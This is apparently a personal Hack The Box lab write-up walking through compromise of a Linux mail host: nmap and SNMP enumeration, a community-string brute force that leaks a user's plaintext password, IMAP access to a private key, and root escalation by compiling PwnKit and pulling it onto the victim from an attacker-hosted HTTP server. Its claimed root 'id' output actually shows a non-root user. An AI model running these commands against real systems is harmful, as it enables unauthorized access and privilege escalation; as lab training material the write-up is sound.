# [Challenge Name] Write-Up 🕒
>
> *Hack The Box*  
> *Date Solved: 2025-05-23*  
> *Category: Web*
> *Tools Used: SSH, POP3S/IMAPS (Dovecot), SNMP*

## Table of Contents

- [\[Challenge Name\] Write-Up 🕒](#challenge-name-write-up-)
  - [Table of Contents](#table-of-contents)
  - [Scenario](#scenario)
    - [Tom’s Private Key](#toms-private-key)
  - [Takeaways \& Lessons Learned](#takeaways--lessons-learned)

---

## Scenario

At each step remember to ask yourself:

- “Am I still in scope?”
- “Could I lock out the very account I need?”
- “What’s the minimum work needed to confirm or deny this path?”

Initial nmap scan

`nmap -p- --open -sS -min-rate 5000 -n -vvv -Pn 10.129.217.100`

<aside>
💡

Not shown: 62808 closed tcp ports (reset), 2722 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
110/tcp open  pop3    syn-ack ttl 63
143/tcp open  imap    syn-ack ttl 63
993/tcp open  imaps   syn-ack ttl 63
995/tcp open  pop3s   syn-ack ttl 63

</aside>

Found open imap and pop3 services i could connect to using both commands respectively, but to enumerate further must find login credentials. already tried anonymous

`openssl s_client -connect 10.129.217.100:pop3s`

`openssl s_client -connect 10.129.217.100:imaps`

Another nmap scan for service versions revealed

993/tcp open ssl/imap Dovecot imapd

995/tcp open ssl/pop3 Dovecot pop3d

I have tried

- default credentials for ubuntu dovecot
  - anonymous login not allowed either
- searchsploit for dovecot ubuntu and google’d CVEs
  - `searchsploit dovecot ubuntu`
- `smbclient -L [//10.129.217.100](https://10.129.217.100/) -N`
  - Since they mentioned it was a mangement system I tried smb clients to see if there was anything I could mount but there were no available shares
- Repeated the process for SMTP proccesses and telnet, but also unavailable.
- Maybe I missed a service/port that I may have missed, so ran a new nmap scan.
- Wanted to avoid, but I’ll try to brute force credentials
  - nah i tried a simple 50 list but it’s supposed to be a quiet search
  - `nmap -p8000-9000 -sV --open 10.129.217.100`
    - no results
  - `nmap -sU -p161 —open 10.129.217.100`
    - 161/udp open snmp
      - A new angle of attack!!!
- Next step was to bruteforce a community string
  - `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.217.100`

    <aside>
    💡

    10.129.217.100 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

    </aside>

  - community string = backup
  - Great info:

    iso.3.6.1.2.1.1.4.0 = STRING: "Admin [tech@inlanefreight.htb](mailto:tech@inlanefreight.htb)"
    iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
    iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"

    STRING: "tom NMds732Js2761"

    "chpasswd: (user tom) pam_chauthtok() failed, error:"

I was able to enter with the community string and read through an email dedicated to Tom and his password change request. After logging in as Tom on the IMAP server we found earlier and going through his inbox, I found one email containing his openssh key, which is huge.

---

### Tom’s Private Key

--BEGIN OPENSSH PRIVATE KEY-----
redacted
-----END OPENSSH PRIVATE KEY-----

After this, I spent over hours trying to find information, double checking if there were any misconfiguration permissions or sudo opportunities. I spent a long time trying to get the DirtyPipe exploit to work, only to find out that the Linux version was incompatible with that exploit.

This was a good lesson for me, because I struggle mostly with the pentesting methodologies and need to remember to stick with the basics. I took a step back and realize my next goalpost was to enumerate and gather as much information as I can, with the big goal being how I can escalate privileges further. I checked the version using `uname -a`

and found the following

<aside>
💡

Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

</aside>

Using a quick google search, I was able to find this exploit that was applicable to this version of Linux.

<https://github.com/ly4k/PwnKit>

I used

`git clone https://github.com/ly4k/PwnKit`

to copy the command onto my attacking machine, and
compiled the exploit statically because there were some errors the first time when i downloaded it directly on Tom’s (victim) shell.

`gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC`

Afterwards I was having troubles with sending through scp, so alternatively I ran an HTTP server where I could download the file from Tom’s machine.

On Attacking Machine:

`python3 -m http.server 8000`

On Victim Machine:

`wget [http://10.10.14.1:8000/](http://10.10.14.1:8000/pwnkit)PwnKit`

Moving to /tmp as these directories are usually writable, I ran

`chmod +x PwnKit && ./PwnKit`

And just like that I was escalated to root privileges. To confirm, running the id command yielded these results.

<aside>
💡

uid=1002(htb-ac-1425177) gid=1002(htb-ac-1425177) groups=1002(htb-ac-1425177),27(sudo),100(users)

</aside>

Next I returned to the home directory, to find out all I can, a simple ls and ls -la found a “users.sql” file. Doing a quick cat on the file led to a list of users with the user “HTB” and the associated password! Lab COMPLETION!

## Takeaways & Lessons Learned

- Stick to the basics: verify your write primitive on a scratch file before chasing kernel exploits.
- Check your kernel early—DirtyPipe only works ≥ 5.8.
- PwnKit and at are almost always present on Ubuntu 20.04. They give root without sudo.
- SNMP can leak valuable creds (Tom’s temp password here).
- Frustration is bound to happen. Take breaks, do sanity checks, and come with a clear mind later if stuck.
  